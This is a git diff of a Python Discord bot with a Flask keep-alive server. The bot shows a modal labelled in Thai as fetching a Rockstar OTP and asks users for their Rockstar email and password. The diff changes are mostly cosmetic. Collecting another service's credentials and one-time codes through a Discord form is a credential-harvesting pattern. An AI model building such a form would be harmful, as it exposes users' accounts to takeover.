@@ -7,36 +7,28 @@ from otp_fetcher import fetch_otp_with_credentials
 from flask import Flask
 from threading import Thread
 
-# Load .env
+# Load .env variables
 load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
 CHANNEL_ID = int(os.getenv("CHANNEL_ID"))
 
-# Flask app for Render keep-alive
-app = Flask(__name__)
+# Flask app for uptime
+flask_app = Flask(__name__)
 
-@app.route('/')
+@flask_app.route("/")
 def index():
-    return "✅ Bot is running on Render!"
+    return "✅ Flask server is alive!"
 
 def run_flask():
-    app.run(host='0.0.0.0', port=5000)
+    flask_app.run(host="0.0.0.0", port=5000)
 
-# Discord bot setup
+# Discord Bot setup
 intents = discord.Intents.default()
-bot = commands.Bot(command_prefix='!', intents=intents)
+bot = commands.Bot(command_prefix="!", intents=intents)
 
 class LoginModal(discord.ui.Modal, title="📨 รับ OTP จาก ROCKSTAR ✅"):
-    email = discord.ui.TextInput(
-        label='📧 Rockstar Email',
-        placeholder='กรอกอีเมลของคุณที่ใช้กับ Rockstar',
-        required=True
-    )
-    password = discord.ui.TextInput(
-        label='🔒 Rockstar Password',
-        placeholder='กรอกรหัสผ่านของคุณ',
-        required=True
-    )
+    email = discord.ui.TextInput(label='📧 Rockstar Email', required=True)
+    password = discord.ui.TextInput(label='🔒 Rockstar Password', required=True)
 
     async def on_submit(self, interaction: discord.Interaction):
         await interaction.response.defer(ephemeral=True, thinking=True)
@@ -71,10 +63,12 @@ async def on_ready():
             ),
             color=0x0e89ff
         )
-        embed.set_image(url="https://i.pinimg.com/originals/00/44/0a/00440aa746a76f99c8990800a91926c1.gif")
         await channel.send(embed=embed, view=LoginButton())
 
-# Run Flask + Bot
-if __name__ == '__main__':
-    Thread(target=run_flask).start()
+# --- RUN BOTH ---
+def run_bot():
     bot.run(TOKEN)
+
+if __name__ == "__main__":
+    Thread(target=run_flask).start()
+    run_bot()
